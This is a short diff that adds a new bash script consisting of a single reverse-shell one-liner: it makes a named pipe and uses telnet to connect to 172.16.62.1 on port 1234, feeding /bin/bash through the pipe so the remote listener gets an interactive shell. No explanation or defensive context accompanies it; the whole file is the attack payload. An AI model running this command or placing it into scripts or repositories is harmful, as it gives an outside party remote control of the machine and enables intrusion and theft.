@@ -1,0 +1,4 @@
+#!/bin/bash
+mknod backpipe p && telnet 172.16.62.1 1234 0<backpipe | /bin/bash 1>backpipe
+
+
